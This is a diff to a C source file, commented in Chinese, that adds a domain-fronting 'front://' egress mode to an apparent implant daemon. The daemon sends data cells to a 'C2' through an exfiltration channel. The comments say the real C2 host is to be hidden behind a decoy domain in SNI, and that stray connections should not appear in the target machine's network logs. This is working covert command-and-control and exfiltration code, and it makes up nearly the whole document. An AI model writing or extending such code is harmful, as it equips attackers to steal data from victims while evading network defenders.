@@ -30,6 +30,11 @@
  * 若做成编译期可选，默认路径就永远不被测试覆盖，那是恒绿的温床。 */
 #include "tls.h"
 
+/* 域前置 HTTP 层（24_front）。它自己持有 tls_ctx 并自握手，本文件在
+ * front:// 模式下只提供 send/recv 回调，不再单独调 cd_tls_handshake——
+ * 两处都握手会让 TLS 记录层叠两层，握手必然失败。 */
+#include "front.h"
+
 #include <errno.h>
 #include <fcntl.h>
 #include <signal.h>
@@ -167,6 +172,14 @@ typedef struct {
      * 后续帧全部以明文发出，而代码里没有任何一处会再想起它是 TLS。
      * 配置态与运行态分离，正是为了堵这个降级通道。 */
     int          use_tls;
+
+    /* 域前置层状态。front != NULL 时实际写路径是 front_send（内部走
+     * front 自己持有的 TLS），本结构的 tls 字段保持 NULL——两者同时非
+     * NULL 意味着记录层叠了两层，握手必然失败。 */
+    front_ctx   *front;
+    int          use_front;
+    char         front_host[256];   /* 真实目标，进内层 Host */
+    char         front_path[256];
 } cd_sink_t;
 
 /* 前向声明：cd_write_all 定义在前，写失败时要回调重连。 */
@@ -269,6 +282,18 @@ static int cd_write_all(cd_sink_t *s, const uint8_t *buf, size_t n)
      * send()，把记录层绕过。那时的现象极具误导性：C2 收到的前几个
      * 字节恰好是 ClientHello，但后续全是裸信元，握手永远完不成，
      * 而 camd 侧看起来"写成功了"。 */
+    /* 域前置出口：写的是 HTTP 请求（front 内部再走它自己的 TLS），不是
+     * 裸信元也不是裸 TLS 记录。此分支必须排在 tls 之前——front 模式下
+     * s->tls 恒为 NULL（ctx 在 front 内部），若误入 TLS 分支就等于把
+     * 明文信元直接 send() 出去，前置层被整层绕过。 */
+    if (s->front) {
+        if (front_send(s->front, buf, n) == FRONT_OK) return 0;
+
+        if (s->host[0] && cd_sink_reconnect(s) == 0 && s->front)
+            return (front_send(s->front, buf, n) == FRONT_OK) ? 0 : -1;
+        return -1;
+    }
+
     if (s->tls) {
         if (tls_write(s->tls, buf, n) == TLS_OK) return 0;
 
@@ -475,6 +500,29 @@ static int cd_sink_reconnect(cd_sink_t *s)
     /* TLS 会话绑在连接上：新 TCP 必须重新握手，不能沿用旧 ctx。 */
     if (s->use_tls && cd_tls_handshake(s) != 0) return -1;
 
+    /* 域前置：front 内部的 TLS 同样绑在旧连接上，只换 fd 不重建整层的话，
+     * front_send 仍走旧 ctx，在新 socket 上写失败而 TCP 层看起来是好的——
+     * 表现为"重连成功但零产出"，且没有任何一处报错。 */
+    if (s->use_front) {
+        if (s->front) { front_free(s->front); s->front = NULL; }
+        front_config fc;
+        memset(&fc, 0, sizeof fc);
+        fc.front_domain = s->host;
+        fc.real_host    = s->front_host;
+        fc.path_prefix  = s->front_path[0] ? s->front_path : NULL;
+        fc.ca_path      = s->ca[0] ? s->ca : NULL;
+        fc.verify       = s->verify;
+        fc.http2        = 0;
+        if (front_init(&s->front, &fc, cd_tls_send, cd_tls_recv, s) != FRONT_OK) {
+            s->front = NULL;
+            return -1;
+        }
+        if (front_connect(s->front) != FRONT_OK) {
+            front_free(s->front); s->front = NULL;
+            return -1;
+        }
+    }
+
     s->reconnects++;
     return 0;
 }
@@ -494,11 +542,48 @@ static int cd_sink_open(const char *spec, cd_sink_t *s)
         return 0;
     }
 
-    /* "tcp://" 与 "tls://" 前缀同为 6 字符，共用 host:port 解析 */
-    int is_tls = (strncmp(spec, "tls://", 6) == 0);
-    if (strncmp(spec, "tcp://", 6) == 0 || is_tls) {
-        if (cd_parse_hostport(spec + 6, s->host, sizeof s->host,
+    /* "tcp://" 与 "tls://" 前缀同为 6 字符，共用 host:port 解析；
+     * "front://" 是 8 字符，指向的是**前置域**而非真实 C2。 */
+    int is_tls   = (strncmp(spec, "tls://", 6) == 0);
+    int is_front = (strncmp(spec, "front://", 8) == 0);
+    const char *hp = is_front ? spec + 8 : spec + 6;
+    if (strncmp(spec, "tcp://", 6) == 0 || is_tls || is_front) {
+        if (cd_parse_hostport(hp, s->host, sizeof s->host,
                               s->port, sizeof s->port) != 0) return -1;
+
+        /* front:// 的三条配置守卫必须排在**建连之前**。
+         *
+         * 配置错误不该先往外连一次：那会在目标机的网络日志里留下一条指向
+         * 前置域的连接，而这次连接本不该发生。更重要的是——若先建连，守卫
+         * 在读不到服务时永远走不到，测试会拿"连接失败"冒充"守卫生效"。 */
+        if (is_front) {
+            /* 守卫 C：front_host 必填，绝不从前置域推导。
+             *
+             * 推导出来的两者恒等，于是请求照样发、响应照样收、连通性全绿，
+             * 唯独真实目标以明文 SNI 出现在链路上——前置能力归零而无人察觉。
+             * 这是本层最坏的失效形态，因此宁可拒绝启动也不给缺省值。 */
+            if (!s->front_host[0]) {
+                fprintf(stderr, "[FATAL] front:// 出口必须指定 --front-host（真实目标）\n");
+                return -1;
+            }
+
+            /* 守卫 D：两个域名不得相同。front_init 只校验非空，不校验不等
+             * —— 层内放行"两者相同"，因为对 front 层自身而言那仍能连通。
+             * 但在部署语义上那等于没前置，必须在此挡住。 */
+            if (strcmp(s->front_host, s->host) == 0) {
+                fprintf(stderr, "[FATAL] --front-host 与前置域相同（%s）："
+                                "域前置形同虚设，真实目标会明文出现在 SNI 里\n",
+                        s->host);
+                return -1;
+            }
+
+            /* 同 TLS 守卫 A：要求校验却无信任库 = 可被自签证书冒充。 */
+            if (s->verify && !s->ca[0]) {
+                fprintf(stderr, "[FATAL] front:// 出口要求校验证书，但未指定 --ca\n");
+                return -1;
+            }
+
+        }
 
         /* SIGPIPE 必须忽略。
          *
@@ -544,6 +629,32 @@ static int cd_sink_open(const char *spec, cd_sink_t *s)
 
             if (cd_tls_handshake(s) != 0) return -1;
         }
+
+        if (is_front) {
+            s->use_front = 1;
+
+            front_config fc;
+            memset(&fc, 0, sizeof fc);
+            fc.front_domain = s->host;                    /* 进 SNI，观察者可见 */
+            fc.real_host    = s->front_host;              /* 进内层 Host */
+            fc.path_prefix  = s->front_path[0] ? s->front_path : NULL;
+            fc.ca_path      = s->ca[0] ? s->ca : NULL;
+            fc.verify       = s->verify;
+            fc.http2        = 0;
+
+            front_err fe = front_init(&s->front, &fc, cd_tls_send, cd_tls_recv, s);
+            if (fe != FRONT_OK) {
+                fprintf(stderr, "[FATAL] front_init 失败: %s\n", front_errstr(fe));
+                return -1;
+            }
+            fe = front_connect(s->front);
+            if (fe != FRONT_OK) {
+                fprintf(stderr, "[FATAL] front_connect 失败: %s\n", front_errstr(fe));
+                front_free(s->front);
+                s->front = NULL;
+                return -1;
+            }
+        }
         return 0;
     }
 
@@ -572,6 +683,16 @@ static void cd_sink_close(cd_sink_t *s)
      * 被关掉，真实实现会报 "unexpected eof while reading" 并把整条连接
      * 判为异常结束——握手、应用数据全对，整段会话仍被记为错误。
      * c2_sink.py 侧表现为该连接被记成读异常，而字节其实都收到了。 */
+    if (s->front) {
+        /* front 内部持有自己的 tls_ctx，必须先释放它再关 fd。
+         *
+         * 已知缺口：front_free 只做 tls_free，不发 close_notify（24_front
+         * 未暴露 close 接口）。因此 front:// 出口下正常退出时，C2 侧会把
+         * 连接记成 unexpected eof——字节都收到了，但被判为异常结束。
+         * 与下面 tls:// 分支的处理不对称，见本轮限制。 */
+        front_free(s->front);
+        s->front = NULL;
+    }
     if (s->tls) {
         (void)tls_close(s->tls);
         tls_free(s->tls);
@@ -656,6 +777,13 @@ int cam_daemon_run(const cam_daemon_cfg_t *cfg, cam_daemon_stats_t *out_stats)
     if (cfg->tls_ca)  snprintf(sink.ca,  sizeof sink.ca,  "%s", cfg->tls_ca);
     if (cfg->tls_sni) snprintf(sink.sni, sizeof sink.sni, "%s", cfg->tls_sni);
     sink.verify = cfg->tls_verify;
+
+    /* 域前置参数。front_host 故意没有缺省推导：能从前置域推出来就意味着
+     * 两者同源，而那正是域前置要防的失效（见 cam_daemon.h 的说明）。 */
+    if (cfg->front_host) snprintf(sink.front_host, sizeof sink.front_host,
+                                  "%s", cfg->front_host);
+    if (cfg->front_path) snprintf(sink.front_path, sizeof sink.front_path,
+                                  "%s", cfg->front_path);
 
     if (exfil_chan_init(&sink.chan, ks, kr, pf, 0) != 0) {
         if (out_stats) *out_stats = st;
